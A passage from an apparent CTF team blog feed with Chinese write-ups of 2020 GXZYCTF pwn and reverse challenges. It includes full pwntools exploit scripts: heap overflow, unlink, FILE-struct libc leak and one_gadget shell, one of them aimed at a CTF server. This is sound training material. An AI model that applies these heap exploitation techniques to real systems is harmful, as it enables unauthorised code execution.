class="number">0x10</span>)+p64(libc_addr + <span class="number">0x294fd8</span>)+p64(<span class="number">0x80</span>))</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">"\x00"</span>)</span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    stack_addr = l64_addr(ru(<span class="string">"\x7f"</span>))</span><br><span class="line">    eip_addr = stack_addr - <span class="number">0x70</span></span><br><span class="line">    rop_addr = <span class="number">0x0000000000014862</span> + libc_addr</span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x80</span>)+p64(eip_addr))</span><br><span class="line">    debug()</span><br><span class="line">    edit(<span class="number">1</span>,p64(rop_addr)+p64(<span class="number">0x290008</span>+libc_addr)+p64(<span class="number">0x42688</span>+libc_addr))</span><br><span class="line">    ShowAddress(<span class="string">"haha"</span>,libc_addr+<span class="number">0x290000</span>)</span><br><span class="line">    ShowAddress(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">    ShowAddress(<span class="string">"stack"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      自定的libc，早期unlink，不存在malloc_hook和free_hook，最后覆盖栈上的EIP进行利用。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
8
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_unlink" scheme="https://boiteam.github.io/tags/Pwn-unlink/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF shotest_path</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_shotest_path/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_shotest_path/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:04:23.943Z</updated>
    
    <content type="html"><![CDATA[<p>最短路径算法的题目，</p><p>应该是实现了Bellman_Ford算法，在Query a route功能查找最短路径时，当变量v5=200时，.BSS段上的NextJump数组溢出到Inuse数组的第一个，即&amp;NextJump[200]=&amp;Inuse[0]，往Inuse[0]写一个地址，可改变第一个Station的inuse状态。<br>当存在负值的环时，会一直执行for循环，直到遍历某个节点的次数大于总节点数时，即n*(n-1)次，当负值环的节点个数n&gt;=15时，可以达到遍历200次以上，从而触发上述漏洞。提前伪造好ptr[0]使其name_ptr指向flag地址即可。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from Fish import *</span><br><span class="line">#flag&#123;SPFA_1s_4_9o0d_A1gorithm&#125;</span><br><span class="line">get_shell(<span class="string">'Shortest_path:121.37.181.246:19008'</span> , <span class="string">'2.27'</span> , <span class="number">64</span>)#nc <span class="number">121.37</span>.<span class="number">181.246</span> <span class="number">19008</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(SID , SPrice , SName , table):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Price: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SPrice)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Name Length: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="built_in">len</span>(SName))</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Name: \n'</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SName)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Number of connected station: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="built_in">len</span>(table))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">ru</span>(<span class="string">'station ID: '</span>)</span><br><span class="line">        <span class="keyword">sl</span>(table[i][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">ru</span>(<span class="string">'distance: '</span>)</span><br><span class="line">        <span class="keyword">sl</span>(table[i][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">def free(SID):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line"></span><br><span class="line">def queryStation(SID):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line"></span><br><span class="line">def queryRoute(SID1 , SID2):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Source Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID1)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Target Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID2)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0</span>x6068E0</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0</span>,<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">0</span>x20,[(<span class="number">17</span>,<span class="number">2</span>)])</span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>,<span class="number">200</span>,<span class="string">'b'</span>*<span class="number">0</span>x20,[(<span class="number">2</span>,-<span class="number">3</span>)])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">17</span>,<span class="number">10</span>,p64(<span class="number">17</span>)+p64(<span class="number">0</span>x6068e0),[(<span class="number">0</span>,<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">add</span>(i , <span class="number">200</span> , <span class="string">'Node'</span> + str(i) , [(i+<span class="number">1</span>,-<span class="number">2</span>)])</span><br><span class="line"><span class="built_in">add</span>(<span class="number">16</span> , <span class="number">600</span> , <span class="string">'Node16'</span> , [(<span class="number">2</span>,-<span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line">queryRoute(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">queryStation(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">active()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最短路径算法的题目，&lt;/p&gt;
&lt;p&gt;应该是实现了Bellman_Ford算法，在Query a route功能查找最短路径时，当变量v5=200时，.BSS段上的NextJump数组溢出到Inuse数组的第一个，即&amp;amp;NextJump[200]=&amp;amp;Inuse[0]，往Inuse[0]写一个地址，可改变第一个Station的inuse状态。&lt;br&gt;当存在负值的环时，会一直执行for循环，直到遍历某个节点的次数大于总节点数时，即n*(n-1)次，当负值环的节点个数n&amp;gt;=15时，可以达到遍历200次以上，从而触发上述漏洞。提前伪造好ptr[0]使其name_ptr指向flag地址即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_reverse" scheme="https://boiteam.github.io/tags/Pwn-reverse/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF woodenbox</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_woodenbox/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_woodenbox/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:05:03.214Z</updated>
    
    <content type="html"><![CDATA[<p>堆溢出，改下一个heap的size，利用文件结构体泄露libc地址。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">02</span>:<span class="number">20</span>:<span class="number">54</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./woodenbox2'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">#libc_name = <span class="string">'./libc6_2.23-0ubuntu11_amd64.so'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"Please enter the length of item name:"</span>,str(size))</span><br><span class="line">    sf(<span class="string">"Please enter the name of item:"</span>,content)</span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"Please enter the index of item:"</span>,str(idx))</span><br><span class="line">    slf(<span class="string">"Please enter the length of item name:"</span>,str(size))</span><br><span class="line">    sf(<span class="string">"item:"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"Please enter the index of item:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    global p</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    else:</span><br><span class="line">        p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">"b"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">"a"</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+<span class="string">"\xdd\x55"</span>)</span><br><span class="line">    #debug()</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">    fake_file = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x28"</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+fake_file)</span><br><span class="line">    recv = ru(<span class="string">'\x7f'</span>)</span><br><span class="line">    print recv</span><br><span class="line">    libc_addr = l64_addr(recv[<span class="number">-6</span>:]) - <span class="number">0x3c5628</span></span><br><span class="line">    ShowAddress(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(libc_addr+<span class="number">0x3c4afd</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">    one = <span class="number">0x45216</span></span><br><span class="line">    one = <span class="number">0x4526a</span></span><br><span class="line">    one = <span class="number">0xf02a4</span></span><br><span class="line">    #one = <span class="number">0xf1147</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(libc_addr+one))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line">for i <span class="keyword">in</span> xrange(<span class="number">30</span>):</span><br><span class="line">    try:</span><br><span class="line">        global p</span><br><span class="line">        pwn()</span><br><span class="line">        break</span><br><span class="line">    except:</span><br><span class="line">        global p</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      堆溢出，改下一个heap的size，利用文件结构体泄露libc地址。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91

    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_file_struct" scheme="https://boiteam.github.io/tags/Pwn-file-struct/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF cyclegraph</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:11:32.459Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一层考点：dump内存</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dword_403370 = 0;</span><br><span class="line">v1 = &amp;unk_403384;</span><br><span class="line">byte_403374 = 48;</span><br><span class="line">v2 = 0;</span><br><span class="line">dword_403378 = (int)&amp;unk_403380;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  v3 = dword_402178[v2];</span><br><span class="line">  ++v2;</span><br><span class="line">  *(v1 - 1) = v3;</span><br><span class="line">  *v1 = (char *)&amp;unk_403380 + 12 * dword_402274[v2];</span><br><span class="line">  v1[1] = (char *)&amp;unk_403380 + 12 * dword_4021F4[v2];</span><br><span class="line">  v1 += 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在OD中执行完后dump出403348内存的值<br><strong>第二层考点：OD下断</strong><br>核心算法</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v4 = dword_403370;</span><br><span class="line">v5 = byte_403374;</span><br><span class="line">v6 = 5;</span><br><span class="line">v7 = dword_403378;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  v11 = *(&amp;v12 + v6);</span><br><span class="line"> <span class="built_in"> if </span>( *(_DWORD *)v7 + v5 == v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + 4);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( v5 - *(_DWORD *)v7 != v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401020(<span class="string">"This is not flag~\n"</span>, v10);</span><br><span class="line">     <span class="keyword"> system</span>(<span class="string">"pause"</span>);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + 8);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(&amp;v12 + v6);</span><br><span class="line">  ++v4;</span><br><span class="line">  ++v6;</span><br><span class="line">  byte_403374 = v5;</span><br><span class="line">  dword_403378 = v7;</span><br><span class="line">  dword_403370 = v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后v7要为0x4034f4。根据dump出的数据在两处if处下断,人工逆运算便可得出flag<br>flag{d8b0bc97a6c0ba27}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;第一层考点：dump内存&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight smali&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;dword_403370 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v1 = &amp;amp;unk_403384;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;byte_403374 = 48;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v2 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dword_403378 = (int)&amp;amp;unk_403380;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;do&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v3 = dword_402178[v2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ++v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *(v1 - 1) = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *v1 = (char *)&amp;amp;unk_403380 + 12 * dword_402274[v2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v1[1] = (char *)&amp;amp;unk_403380 + 12 * dword_4021F4[v2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v1 += 3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_下断点调试" scheme="https://boiteam.github.io/tags/Re-%E4%B8%8B%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF easyparse</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_easyparse/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_easyparse/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:10:50.353Z</updated>
    
    <content type="html"><![CDATA[<p>题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。<br><strong>第一层考点：下准断点</strong><br>这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点<br>_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef<br>每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到pintools爆破求解<br>但稍微耐心点调试发现加密过程很简单<br>密文是程序执行过程中生成的也需要dump<br>解密脚本如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = [<span class="number">144</span>, <span class="number">332</span>, <span class="number">28</span>, <span class="number">240</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">240</span>, <span class="number">208</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">52</span>, <span class="number">240</span>, <span class="number">276</span>, <span class="number">240</span>, <span class="number">128</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">240</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">44</span>, <span class="number">264</span>, <span class="number">240</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">if</span>((c^<span class="number">0x63</span>)&lt;&lt;(<span class="number">2</span>&amp;<span class="number">0x3f</span>)==i):</span><br><span class="line">flag+=chr(c)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
